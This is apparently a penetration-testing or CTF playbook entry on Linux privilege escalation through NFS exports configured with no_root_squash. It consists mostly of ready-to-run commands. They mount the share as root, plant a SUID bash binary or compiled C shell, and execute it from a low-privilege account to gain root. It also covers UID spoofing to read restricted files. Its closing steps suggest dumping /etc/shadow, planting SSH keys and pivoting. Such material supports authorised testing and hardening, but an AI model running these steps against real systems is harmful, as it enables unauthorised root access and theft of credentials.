---
id: linux-nfs-privesc
title: NFS no_root_squash Privesc
stage: privesc
tags: [linux, nfs]
summary: Plant a SUID bash binary via an NFS export with no_root_squash — you create the binary as root on your attacker machine, the target executes it as root with no shell required.
leads_to:
  - root-linux
---

## Prerequisites

An NFS export with `no_root_squash` set (visible in `/etc/exports` via LFI or a mounted share). You must have root on your attacker machine to set SUID ownership. The target must be able to execute the binary on the mounted share.

`no_root_squash` means the NFS server trusts root from the connecting machine. If your attacker machine mounts the export as root, files you create are owned by root on the server. Plant a SUID bash binary, then execute it from your low-priv shell on the target to get root. No exploit, no password — just a misconfig.

## Quick Win

> Check exports on the target via /etc/exports or showmount.

```bash
# From attacker — enumerate exports
showmount -e $TARGET

# From target (via LFI or existing shell)
cat /etc/exports
```

## Identify Vulnerable Export

```bash
# /etc/exports entry that's vulnerable:
/share  *(rw,no_root_squash)
# or
/home/user  *(rw,no_root_squash,no_subtree_check)
```

## Exploit — Plant SUID Binary

```bash
# === On ATTACKER MACHINE (as root) ===

# Mount the export
mkdir /tmp/nfs
mount -t nfs $TARGET:/share /tmp/nfs -o nolock

# Copy bash and set SUID
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
ls -la /tmp/nfs/bash  # should show -rwsr-sr-x ... root root

# Unmount
umount /tmp/nfs
```

```bash
# === On TARGET (low-priv shell) ===

# Navigate to the NFS share path (local mount point)
ls -la /share/bash   # confirm SUID root

# Execute as root
/share/bash -p
id  # uid=1000 euid=0(root)
```

## Alternative: SUID Shell Binary (C)

```bash
# On attacker as root
cat > /tmp/nfs/shell.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }
EOF
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell
```

## UID Spoofing (no_root_squash not required)

> If you know the target file owner's UID, create a local user with matching UID to access restricted files.

```bash
# From target — find file UID
ls -la /nfs_share/restricted_file   # e.g., uid=1337

# On attacker — create user with same UID
useradd -u 1337 nfsuser
su nfsuser
cat /mnt/nfs/restricted_file
```

## Leads To

SUID bash or shell binary on NFS share → `/share/bash -p` → euid=0 (root) → `cat /root/root.txt`. From root shell: dump `/etc/shadow`, plant SSH key, enumerate internal network for pivot.
